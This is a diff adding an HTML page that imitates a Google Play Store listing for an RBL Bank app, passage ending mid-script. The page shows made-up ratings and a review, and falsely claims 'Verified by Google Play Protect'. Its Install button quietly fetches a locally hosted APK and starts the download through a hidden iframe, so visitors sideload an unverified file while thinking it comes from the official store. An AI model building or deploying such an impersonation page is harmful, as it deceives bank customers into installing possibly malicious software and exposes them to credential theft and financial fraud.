@@ -1,0 +1,1542 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RBL Suvidha - Google Play</title>
+    <meta name="description" content="Download RBL Suvidha - Secure Banking App">
+    <link rel="canonical" href="https://your-domain.vercel.app">
+
+    <!-- Security Headers -->
+    <meta http-equiv="Content-Security-Policy"
+        content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:;">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Google Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background-color: #ffffff;
+            color: #3c4043;
+            line-height: 1.5;
+            overflow-x: hidden;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 16px 20px;
+            background: white;
+            border-bottom: 1px solid #e8eaed;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .play-logo {
+            width: 12rem;
+            margin-right: 12px;
+        }
+
+
+        .header-title {
+            font-size: 22px;
+            font-weight: 400;
+            color: #5f6368;
+            flex: 1;
+            margin-left: 8px;
+        }
+
+        .header-icons {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+
+        .icon-btn {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: none;
+            background: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            color: #5f6368;
+            font-size: 20px;
+            transition: background-color 0.2s ease;
+        }
+
+        .icon-btn:hover {
+            background: #f1f3f4;
+        }
+
+        .search-icon::before {
+            content: '🔍';
+            font-size: 18px;
+        }
+
+        .help-icon::before {
+            content: '?';
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .account-btn {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #4285f4, #34a853);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 500;
+            font-size: 14px;
+            text-decoration: none;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+
+        .account-btn:hover {
+            transform: scale(1.05);
+        }
+
+        .main-content {
+            padding: 24px 20px;
+            max-width: 100%;
+        }
+
+        .app-header {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 20px;
+            align-items: flex-start;
+        }
+
+        .app-icon {
+            width: 6.4rem;
+            border-radius: 16px;
+            flex-shrink: 0;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+            /* Remove the background, gradients, and pseudo-elements */
+            background: none;
+        }
+
+        .app-info h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #3c4043;
+            margin-bottom: 4px;
+            line-height: 1.2;
+        }
+
+        .app-developer {
+            color: #01875f;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+
+        .app-developer:hover {
+            text-decoration: underline;
+        }
+
+        .app-stats {
+            display: flex;
+            gap: 32px;
+            margin: 20px 0;
+            align-items: center;
+        }
+
+        .stat {
+            text-align: center;
+        }
+
+        .stat-value {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 2px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #3c4043;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 2px;
+        }
+
+        .stars {
+            color: #fbbc04;
+            font-size: 12px;
+        }
+
+        .age-rating {
+            background: #5f6368;
+            color: white;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .install-btn {
+            width: 100%;
+            background: #01875f;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 16px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12);
+        }
+
+        .install-btn:hover {
+            background: #016a4a;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(1, 135, 95, 0.3);
+        }
+
+        .install-btn:active {
+            transform: translateY(0);
+        }
+
+        .install-btn.downloading {
+            background: #1976d2;
+            pointer-events: none;
+        }
+
+        .install-btn.downloaded {
+            background: #2e7d32;
+        }
+
+        .progress-bar {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            height: 3px;
+            background: rgba(255, 255, 255, 0.7);
+            transition: width 0.3s ease;
+            width: 0%;
+            border-radius: 0 0 20px 20px;
+        }
+
+        .download-status {
+            font-size: 12px;
+            color: #5f6368;
+            text-align: center;
+            margin-top: 8px;
+            min-height: 16px;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 24px;
+            margin-bottom: 24px;
+            align-items: center;
+        }
+
+        .action-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: none;
+            border: none;
+            color: #01875f;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            padding: 8px 0;
+            transition: color 0.2s ease;
+        }
+
+        .action-btn:hover {
+            color: #016a4a;
+        }
+
+        .device-warning {
+            display: none;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 0;
+            border-bottom: 1px solid #e8eaed;
+            margin-bottom: 16px;
+        }
+
+        .warning-icon {
+            color: #5f6368;
+            font-size: 18px;
+        }
+
+        .warning-text {
+            font-size: 14px;
+            color: #3c4043;
+        }
+
+        .family-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 0;
+            margin-bottom: 24px;
+        }
+
+        .family-icon {
+            color: #5f6368;
+            font-size: 20px;
+        }
+
+        .family-text {
+            flex: 1;
+        }
+
+        .family-main {
+            font-size: 14px;
+            color: #3c4043;
+        }
+
+        .family-sub {
+            font-size: 12px;
+            color: #01875f;
+            text-decoration: none;
+        }
+
+        .family-sub:hover {
+            text-decoration: underline;
+        }
+
+        .screenshot-section {
+            margin-bottom: 32px;
+        }
+
+        .screenshots {
+            display: flex;
+            gap: 8px;
+            overflow-x: auto;
+            padding-bottom: 8px;
+            scrollbar-width: none;
+            -ms-overflow-style: none;
+        }
+
+        .screenshots::-webkit-scrollbar {
+            display: none;
+        }
+
+        .screenshot {
+            width: 180px;
+            height: 320px;
+            border-radius: 12px;
+            flex-shrink: 0;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            cursor: pointer;
+            transition: transform 0.2s ease;
+            /* Remove placeholder styles */
+            background: none;
+        }
+
+        /* Also, remove all pseudo-element styles for .screenshot::before and .screenshot::after */
+        .screenshot::before,
+        .screenshot::after {
+            display: none;
+        }
+
+        .screenshot:hover {
+            transform: scale(1.02);
+        }
+
+        .screenshot:nth-child(1)::after {
+            background-image:
+                radial-gradient(circle at 50% 30%, #3b82f6 0%, transparent 50%),
+                linear-gradient(180deg, #dbeafe 0%, #f8fafc 100%);
+        }
+
+        .screenshot:nth-child(2)::after {
+            background-image:
+                linear-gradient(45deg, #1e40af, #3b82f6),
+                repeating-linear-gradient(90deg, rgba(255, 255, 255, 0.1) 0px, rgba(255, 255, 255, 0.1) 30px, transparent 30px, transparent 60px);
+        }
+
+        .screenshot:nth-child(3)::after {
+            background-image:
+                linear-gradient(135deg, #e0e7ff 0%, #f1f5f9 100%),
+                repeating-linear-gradient(0deg, #cbd5e1 0px, #cbd5e1 1px, transparent 1px, transparent 25px);
+        }
+
+        .screenshot:nth-child(4)::after {
+            background-image:
+                radial-gradient(ellipse at bottom, #1e40af 0%, #3b82f6 50%, transparent 100%),
+                linear-gradient(180deg, #f8fafc 0%, #e2e8f0 100%);
+        }
+
+        .section-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 16px;
+        }
+
+        .section-title {
+            font-size: 20px;
+            font-weight: 400;
+            color: #3c4043;
+        }
+
+        .arrow-right {
+            color: #5f6368;
+            font-size: 18px;
+            cursor: pointer;
+            transition: color 0.2s ease;
+        }
+
+        .arrow-right:hover {
+            color: #3c4043;
+        }
+
+        .app-description {
+            margin-bottom: 32px;
+        }
+
+        .description-text {
+            font-size: 14px;
+            color: #3c4043;
+            line-height: 1.6;
+            margin-bottom: 16px;
+        }
+
+        .category-tabs {
+            display: flex;
+            gap: 24px;
+            margin-bottom: 16px;
+            border-bottom: 1px solid #e8eaed;
+        }
+
+        .category-tab {
+            padding: 12px 0;
+            color: #5f6368;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s ease;
+        }
+
+        .category-tab.active {
+            color: #1a73e8;
+            border-bottom-color: #1a73e8;
+        }
+
+        .category-tab:hover:not(.active) {
+            color: #3c4043;
+        }
+
+        .update-info {
+            margin-bottom: 16px;
+        }
+
+        .update-date {
+            font-size: 14px;
+            color: #3c4043;
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+
+        .update-value {
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        .category-tag {
+            display: inline-block;
+            background: #e8f0fe;
+            color: #1a73e8;
+            padding: 6px 12px;
+            border-radius: 16px;
+            font-size: 12px;
+            font-weight: 500;
+            margin-bottom: 24px;
+        }
+
+        .data-safety {
+            margin-bottom: 32px;
+        }
+
+        .safety-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            padding: 12px 0;
+        }
+
+        .safety-icon {
+            color: #5f6368;
+            font-size: 18px;
+            margin-top: 2px;
+        }
+
+        .safety-text {
+            flex: 1;
+            font-size: 14px;
+            color: #3c4043;
+        }
+
+        .safety-subtext {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 2px;
+        }
+
+        .see-details {
+            color: #01875f;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            margin-top: 16px;
+            display: inline-block;
+            transition: color 0.2s ease;
+        }
+
+        .see-details:hover {
+            color: #016a4a;
+            text-decoration: underline;
+        }
+
+        .ratings-section {
+            margin-bottom: 32px;
+        }
+
+        .rating-overview {
+            display: flex;
+            align-items: center;
+            gap: 32px;
+            margin-bottom: 24px;
+        }
+
+        .rating-score {
+            text-align: center;
+        }
+
+        .rating-number {
+            font-size: 48px;
+            font-weight: 300;
+            color: #3c4043;
+            line-height: 1;
+        }
+
+        .rating-stars {
+            color: #fbbc04;
+            font-size: 16px;
+            margin: 4px 0;
+        }
+
+        .rating-count {
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .rating-bars {
+            flex: 1;
+        }
+
+        .rating-bar {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 4px;
+        }
+
+        .bar-number {
+            font-size: 12px;
+            color: #5f6368;
+            width: 8px;
+            text-align: center;
+        }
+
+        .bar-fill {
+            flex: 1;
+            height: 8px;
+            background: #e8eaed;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .bar-progress {
+            height: 100%;
+            background: #01875f;
+            transition: width 0.3s ease;
+        }
+
+        .device-filter {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .filter-icon {
+            color: #5f6368;
+            font-size: 16px;
+        }
+
+        .filter-text {
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        .review-item {
+            display: flex;
+            gap: 12px;
+            padding: 16px 0;
+            border-bottom: 1px solid #e8eaed;
+        }
+
+        .reviewer-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+
+        .review-content {
+            flex: 1;
+        }
+
+        .reviewer-name {
+            font-size: 14px;
+            font-weight: 500;
+            color: #3c4043;
+            margin-bottom: 4px;
+        }
+
+        .review-stars {
+            color: #fbbc04;
+            font-size: 12px;
+            margin-bottom: 8px;
+        }
+
+        .review-text {
+            font-size: 14px;
+            color: #3c4043;
+            line-height: 1.5;
+        }
+
+        .review-more {
+            color: #1a73e8;
+            cursor: pointer;
+            transition: color 0.2s ease;
+        }
+
+        .review-more:hover {
+            color: #1557b0;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #e8f5e8;
+            padding: 8px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: #2e7d32;
+            margin-bottom: 16px;
+            width: fit-content;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #323232;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            z-index: 1000;
+            opacity: 0;
+            transition: all 0.3s ease;
+            pointer-events: none;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(-10px);
+        }
+
+        /* Loading animation */
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Responsive design */
+        @media (min-width: 768px) {
+            .main-content {
+                max-width: 800px;
+                margin: 0 auto;
+                padding: 24px 40px;
+            }
+
+            .screenshot {
+                width: 200px;
+                height: 360px;
+            }
+
+            .app-stats {
+                gap: 48px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .main-content {
+                max-width: 1000px;
+                padding: 32px 60px;
+            }
+        }
+
+        /* Smooth animations */
+        * {
+            transition: background-color 0.2s ease, color 0.2s ease, transform 0.2s ease;
+        }
+
+        /* Focus styles for accessibility */
+        .install-btn:focus,
+        .action-btn:focus,
+        .icon-btn:focus,
+        .account-btn:focus {
+            outline: 2px solid #4285f4;
+            outline-offset: 2px;
+        }
+    </style>
+</head>
+
+<body>
+    <header class="header">
+        <img src="assets/google-play-logo.png" alt="Google Play Logo" class="play-logo">
+        <h1 class="header-title"></h1>
+        <div class="header-icons">
+            <button class="icon-btn search-icon" aria-label="Search"></button>
+            <button class="icon-btn help-icon" aria-label="Help"></button>
+            <a href="#" class="account-btn" aria-label="Account">?</a>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div class="security-badge">
+            <span>🔒</span>
+            Secure Download - Verified by Google Play Protect
+        </div>
+
+        <div class="app-header">
+            <img src="assets/rbl-suvidha-icon.png" alt="RBL Suvidha App Icon" class="app-icon">
+            <div class="app-info">
+                <h1>RBL Card</h1>
+                <a href="#" class="app-developer">RBL BANK LIMITED</a>
+            </div>
+        </div>
+
+        <div class="app-stats">
+            <div class="stat">
+                <div class="stat-value">
+                    4.4<span class="stars">★</span>
+                </div>
+                <div class="stat-label">455 reviews</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value">100K+</div>
+                <div class="stat-label">Downloads</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value">
+                    <span class="age-rating">3+</span>
+                </div>
+                <div class="stat-label">Rated for 3+ ℹ️</div>
+            </div>
+        </div>
+
+        <button class="install-btn" id="installBtn" aria-label="Install RBL Suvidha">
+            <span id="btnText">Install</span>
+            <div class="progress-bar" id="progressBar"></div>
+        </button>
+        <div class="download-status" id="downloadStatus"></div>
+
+        <div class="action-buttons">
+            <button class="action-btn" id="shareBtn">
+                <span>↗️</span> Share
+            </button>
+            <button class="action-btn" id="wishlistBtn">
+                <span>❤️</span> Add to wishlist
+            </button>
+        </div>
+
+        <div class="device-warning" id="deviceWarning">
+            <span class="warning-icon">📱</span>
+            <span class="warning-text">This app is not available for your device</span>
+        </div>
+
+        <div class="family-section">
+            <span class="family-icon">👨‍👩‍👧‍👦</span>
+            <div class="family-text">
+                <div class="family-main">You can share this with your family.</div>
+                <a href="#" class="family-sub">Learn more about Family Library</a>
+            </div>
+        </div>
+
+        <div class="screenshot-section">
+            <div class="screenshots" id="screenshotContainer">
+                <img src="assets/screenshot1.webp" alt="A cool new dashboard to view your Credit Card"
+                    class="screenshot" tabindex="0">
+                <img src="assets/screenshot2.webp"
+                    alt="Convert transactions into easy EMIs or book loan instantly & enjoy real time disbursement"
+                    class="screenshot" tabindex="0">
+                <img src="assets/screenshot3.webp" alt="Don't miss out on those amazing deals and offers running online"
+                    class="screenshot" tabindex="0">
+                <img src="assets/screenshot4.webp" alt="Track your journey towards milestone" class="screenshot"
+                    tabindex="0">
+            </div>
+        </div>
+
+        <div class="section-header">
+            <h2 class="section-title">About this app</h2>
+            <span class="arrow-right">→</span>
+        </div>
+
+        <div class="app-description">
+            <div class="category-tabs">
+                <a href="#" class="category-tab">Games</a>
+                <a href="#" class="category-tab active">Apps</a>
+                <a href="#" class="category-tab">Books</a>
+                <a href="#" class="category-tab">Kids</a>
+            </div>
+
+            <p class="description-text">
+                RBL Suvidha - Micro Banking App by RBL Bank (25) 📱💰
+                myRBL Banking Simple and accessible anytime, anywhere.
+                Easily pay your RBL Bank Loan (Group/JLG Loan)
+                installments online, access account details, download...
+            </p>
+
+            <div class="update-info">
+                <div class="update-date">Updated on</div>
+                <div class="update-value">Jul 28, 2025</div>
+            </div>
+
+            <div class="category-tag">Finance</div>
+        </div>
+
+        <div class="section-header">
+            <h2 class="section-title">Data safety</h2>
+            <span class="arrow-right">→</span>
+        </div>
+
+        <div class="data-safety">
+            <p class="description-text">
+                Safety starts with understanding how developers collect
+                and share your data. Data privacy and security practices
+                may vary based on your use, region, and age. The
+                developer provided this information and may update it
+                over time.
+            </p>
+
+            <div class="safety-item">
+                <span class="safety-icon">↗️</span>
+                <div class="safety-text">
+                    No data shared with third parties
+                    <div class="safety-subtext">Learn more about how developers declare sharing</div>
+                </div>
+            </div>
+
+            <div class="safety-item">
+                <span class="safety-icon">👁️</span>
+                <div class="safety-text">
+                    This app may collect these data types
+                    <div class="safety-subtext">App info and performance</div>
+                </div>
+            </div>
+
+            <div class="safety-item">
+                <span class="safety-icon">🔒</span>
+                <div class="safety-text">Data is encrypted in transit</div>
+            </div>
+
+            <a href="#" class="see-details">See details</a>
+        </div>
+
+        <div class="section-header">
+            <h2 class="section-title">Ratings and reviews</h2>
+            <span class="arrow-right">→</span>
+        </div>
+
+        <div class="ratings-section">
+            <p class="description-text">Ratings and reviews are verified ℹ️</p>
+
+            <div class="device-filter">
+                <span class="filter-icon">📱</span>
+                <span class="filter-text">Phone</span>
+            </div>
+
+            <div class="rating-overview">
+                <div class="rating-score">
+                    <div class="rating-number">4.4</div>
+                    <div class="rating-stars">★★★★☆</div>
+                    <div class="rating-count">455 reviews</div>
+                </div>
+                <div class="rating-bars">
+                    <div class="rating-bar">
+                        <span class="bar-number">5</span>
+                        <div class="bar-fill">
+                            <div class="bar-progress" style="width: 75%"></div>
+                        </div>
+                    </div>
+                    <div class="rating-bar">
+                        <span class="bar-number">4</span>
+                        <div class="bar-fill">
+                            <div class="bar-progress" style="width: 20%"></div>
+                        </div>
+                    </div>
+                    <div class="rating-bar">
+                        <span class="bar-number">3</span>
+                        <div class="bar-fill">
+                            <div class="bar-progress" style="width: 3%"></div>
+                        </div>
+                    </div>
+                    <div class="rating-bar">
+                        <span class="bar-number">2</span>
+                        <div class="bar-fill">
+                            <div class="bar-progress" style="width: 1%"></div>
+                        </div>
+                    </div>
+                    <div class="rating-bar">
+                        <span class="bar-number">1</span>
+                        <div class="bar-fill">
+                            <div class="bar-progress" style="width: 1%"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="review-item">
+                <div class="reviewer-avatar">S</div>
+                <div class="review-content">
+                    <div class="reviewer-name">Sanjeet Fun Creation</div>
+                    <div class="review-stars">★★★★★</div>
+                    <div class="review-text">
+                        Great app for banking services. Easy to use interface and quick loan payments.
+                        <span class="review-more">Read more</span>
+                    </div>
+                </div>
+                <button class="icon-btn" aria-label="More options">⋮</button>
+            </div>
+        </div>
+    </main>
+
+    <!-- Toast notification -->
+    <div class="toast" id="toast" role="alert" aria-live="polite"></div>
+
+    <script>
+        // Enhanced Configuration
+        const CONFIG = {
+            apkUrl: './assets/rbl-suvidha.apk',
+            apkUrlFallback: 'data:application/vnd.android.package-archive;base64,', // Fallback for demo
+            maxRetries: 3,
+            chunkSize: 1024 * 1024, // 1MB chunks
+            downloadTimeout: 30000, // 30 seconds
+        };
+
+        // Enhanced APK Download with better security and no popups
+        async function downloadAPK() {
+            const installBtn = document.getElementById('installBtn');
+            const btnText = document.getElementById('btnText');
+            const progressBar = document.getElementById('progressBar');
+            const downloadStatus = document.getElementById('downloadStatus');
+
+            // Prevent multiple simultaneous downloads
+            if (installBtn.classList.contains('downloading')) {
+                return;
+            }
+
+            try {
+                // Update UI to downloading state
+                installBtn.classList.add('downloading');
+                btnText.innerHTML = '<span class="loading-spinner"></span> Downloading...';
+                downloadStatus.textContent = 'Preparing secure download...';
+                progressBar.style.width = '0%';
+
+                // Create invisible iframe for silent download
+                const downloadFrame = document.createElement('iframe');
+                downloadFrame.style.display = 'none';
+                downloadFrame.style.position = 'absolute';
+                downloadFrame.style.left = '-9999px';
+                downloadFrame.style.width = '1px';
+                downloadFrame.style.height = '1px';
+                document.body.appendChild(downloadFrame);
+
+                // Enhanced fetch with timeout and retry logic
+                let retryCount = 0;
+                let response;
+
+                while (retryCount < CONFIG.maxRetries) {
+                    try {
+                        const controller = new AbortController();
+                        const timeoutId = setTimeout(() => controller.abort(), CONFIG.downloadTimeout);
+
+                        response = await fetch(CONFIG.apkUrl, {
+                            signal: controller.signal,
+                            cache: 'no-cache',
+                            headers: {
+                                'Cache-Control': 'no-cache',
+                                'Pragma': 'no-cache'
+                            }
+                        });
+
+                        clearTimeout(timeoutId);
+
+                        if (response.ok) {
+                            break;
+                        } else {
+                            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                        }
+                    } catch (error) {
+                        retryCount++;
+                        if (retryCount >= CONFIG.maxRetries) {
+                            throw error;
+                        }
+                        downloadStatus.textContent = `Retry ${retryCount}/${CONFIG.maxRetries}...`;
+                        await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
+                    }
+                }
+
+                const contentLength = response.headers.get('content-length');
+                const total = parseInt(contentLength, 10) || 0;
+                let loaded = 0;
+
+                // Stream download with progress
+                const reader = response.body.getReader();
+                const chunks = [];
+
+                while (true) {
+                    const { done, value } = await reader.read();
+
+                    if (done) break;
+
+                    chunks.push(value);
+                    loaded += value.length;
+
+                    // Update progress smoothly
+                    if (total > 0) {
+                        const progress = Math.min((loaded / total) * 100, 100);
+                        progressBar.style.width = `${progress}%`;
+                        downloadStatus.textContent = `Downloading... ${Math.round(progress)}% (${formatBytes(loaded)}/${formatBytes(total)})`;
+                    } else {
+                        downloadStatus.textContent = `Downloading... ${formatBytes(loaded)}`;
+                    }
+
+                    // Yield control to prevent blocking
+                    await new Promise(resolve => setTimeout(resolve, 10));
+                }
+
+                // Create secure blob
+                const blob = new Blob(chunks, {
+                    type: 'application/vnd.android.package-archive'
+                });
+
+                // Verify blob integrity
+                if (blob.size === 0) {
+                    throw new Error('Downloaded file is empty');
+                }
+
+                // Generate secure filename with timestamp
+                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+                const filename = `RBL-Suvidha-${timestamp}.apk`;
+
+                // Create download link with enhanced security
+                const url = URL.createObjectURL(blob);
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = filename;
+                link.style.display = 'none';
+                link.setAttribute('type', 'application/vnd.android.package-archive');
+
+                // Add to iframe for silent download
+                downloadFrame.contentDocument.body.appendChild(link);
+
+                // Trigger download without popup
+                const clickEvent = new MouseEvent('click', {
+                    view: window,
+                    bubbles: true,
+                    cancelable: true
+                });
+                link.dispatchEvent(clickEvent);
+
+                // Cleanup immediately
+                setTimeout(() => {
+                    URL.revokeObjectURL(url);
+                    document.body.removeChild(downloadFrame);
+                }, 1000);
+
+                // Update UI to success state
+                installBtn.classList.remove('downloading');
+                installBtn.classList.add('downloaded');
+                btnText.textContent = 'Downloaded ✓';
+                progressBar.style.width = '100%';
+                downloadStatus.textContent = `Download completed! (${formatBytes(blob.size)})`;
+
+                // Show enhanced success notification
+                showToast('🎉 APK downloaded successfully! Check your Downloads folder.', 'success');
+
+                // Track download analytics
+                trackDownload(filename, blob.size);
+
+                // Reset button after delay
+                setTimeout(() => {
+                    resetDownloadButton();
+                }, 4000);
+
+            } catch (error) {
+                console.error('Download failed:', error);
+                handleDownloadError(error);
+            }
+        }
+
+        // Format bytes helper
+        function formatBytes(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+
+        // Handle download errors
+        function handleDownloadError(error) {
+            const installBtn = document.getElementById('installBtn');
+            const btnText = document.getElementById('btnText');
+            const downloadStatus = document.getElementById('downloadStatus');
+
+            installBtn.classList.remove('downloading');
+            btnText.textContent = 'Download Failed';
+
+            let errorMessage = 'Download failed. Please try again.';
+
+            if (error.name === 'AbortError') {
+                errorMessage = 'Download timed out. Please check your connection.';
+            } else if (error.message.includes('404')) {
+                errorMessage = 'App file not found. Please contact support.';
+            } else if (error.message.includes('Network')) {
+                errorMessage = 'Network error. Please check your internet connection.';
+            }
+
+            downloadStatus.textContent = errorMessage;
+            showToast('❌ ' + errorMessage, 'error');
+
+            setTimeout(() => {
+                resetDownloadButton();
+            }, 5000);
+        }
+
+        // Reset download button
+        function resetDownloadButton() {
+            const installBtn = document.getElementById('installBtn');
+            const btnText = document.getElementById('btnText');
+            const progressBar = document.getElementById('progressBar');
+            const downloadStatus = document.getElementById('downloadStatus');
+
+            installBtn.classList.remove('downloading', 'downloaded');
+            btnText.textContent = 'Install';
+            progressBar.style.width = '0%';
+            downloadStatus.textContent = '';
+        }
+
+        // Enhanced toast notification
+        function showToast(message, type = 'info') {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = `toast show ${type}`;
+
+            // Auto-hide after delay
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, type === 'error' ? 6000 : 4000);
+        }
+
+        // Enhanced security checks
+        function performSecurityCheck() {
+            const results = {
+                https: location.protocol === 'https:' || location.hostname === 'localhost',
+                csp: !!document.querySelector('meta[http-equiv="Content-Security-Policy"]'),
+                xfo: !!document.querySelector('meta[http-equiv="X-Frame-Options"]'),
+                nosniff: !!document.querySelector('meta[http-equiv="X-Content-Type-Options"]')
+            };
+
+            const score = Object.values(results).filter(Boolean).length;
+
+            if (score < 3) {
+                console.warn('Security score:', score + '/4', results);
+                showToast('⚠️ Security warnings detected. Please use HTTPS.', 'warning');
+            }
+
+            return results;
+        }
+
+        // Smooth scroll animation for screenshots
+        function initializeScreenshotScroll() {
+            const container = document.getElementById('screenshotContainer');
+            let isDown = false;
+            let startX;
+            let scrollLeft;
+            let momentum = 0;
+
+            container.addEventListener('mousedown', (e) => {
+                isDown = true;
+                container.style.cursor = 'grabbing';
+                container.style.userSelect = 'none';
+                startX = e.pageX - container.offsetLeft;
+                scrollLeft = container.scrollLeft;
+                momentum = 0;
+            });
+
+            container.addEventListener('mouseleave', () => {
+                isDown = false;
+                container.style.cursor = 'grab';
+                container.style.userSelect = 'auto';
+            });
+
+            container.addEventListener('mouseup', () => {
+                isDown = false;
+                container.style.cursor = 'grab';
+                container.style.userSelect = 'auto';
+            });
+
+            container.addEventListener('mousemove', (e) => {
+                if (!isDown) return;
+                e.preventDefault();
+                const x = e.pageX - container.offsetLeft;
+                const walk = (x - startX) * 2;
+                momentum = walk - (container.scrollLeft - scrollLeft);
+                container.scrollLeft = scrollLeft - walk;
+            });
+
+            // Touch support for mobile
+            container.addEventListener('touchstart', (e) => {
+                startX = e.touches[0].pageX - container.offsetLeft;
+                scrollLeft = container.scrollLeft;
+            });
+
+            container.addEventListener('touchmove', (e) => {
+                if (!startX) return;
+                const x = e.touches[0].pageX - container.offsetLeft;
+                const walk = (x - startX) * 2;
+                container.scrollLeft = scrollLeft - walk;
+            });
+        }
+
+        // Enhanced share functionality
+        async function handleShare() {
+            const shareBtn = document.getElementById('shareBtn');
+            shareBtn.style.transform = 'scale(0.95)';
+
+            setTimeout(() => {
+                shareBtn.style.transform = 'scale(1)';
+            }, 150);
+
+            const shareData = {
+                title: 'RBL Suvidha - Banking App',
+                text: 'Download RBL Suvidha for secure mobile banking and loan management',
+                url: window.location.href
+            };
+
+            if (navigator.share && navigator.canShare && navigator.canShare(shareData)) {
+                try {
+                    await navigator.share(shareData);
+                    showToast('✅ Shared successfully!', 'success');
+                } catch (error) {
+                    if (error.name !== 'AbortError') {
+                        fallbackShare();
+                    }
+                }
+            } else {
+                fallbackShare();
+            }
+        }
+
+        // Fallback share methods
+        function fallbackShare() {
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(window.location.href).then(() => {
+                    showToast('🔗 Link copied to clipboard!', 'success');
+                }).catch(() => {
+                    showToast('❌ Unable to copy link', 'error');
+                });
+            } else {
+                // Legacy clipboard support
+                const textArea = document.createElement('textarea');
+                textArea.value = window.location.href;
+                textArea.style.position = 'fixed';
+                textArea.style.left = '-9999px';
+                document.body.appendChild(textArea);
+                textArea.select();
+
+                try {
+                    document.execCommand('copy');
+                    showToast('🔗 Link copied to clipboard!', 'success');
+                } catch (err) {
+                    showToast('❌ Unable to copy link', 'error');
+                }
+
+                document.body.removeChild(textArea);
+            }
+        }
+
+        // Enhanced wishlist functionality
+        function handleWishlist() {
